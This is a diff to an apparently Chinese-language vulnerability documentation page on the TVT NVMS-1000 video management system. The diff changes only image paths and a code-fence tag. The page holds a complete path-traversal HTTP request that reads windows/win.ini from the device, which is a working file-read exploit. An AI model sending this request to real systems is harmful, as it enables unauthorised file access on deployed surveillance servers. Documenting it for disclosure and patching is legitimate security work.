@@ -20,11 +20,9 @@ app="TVT-NVMS-1000"
 
 登录页面如下
 
+![](../.gitbook/assets/202202162301376.png)发送请求包读取文件
 
-
-![](images/202202162301376.png)发送请求包读取文件
-
-```plain
+```
 GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
 Host: 
 Cache-Control: max-age=0
@@ -36,4 +34,4 @@ Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
 Connection: close
 ```
 
-![](images/202202162302589.png)
+![](../.gitbook/assets/202202162302589.png)
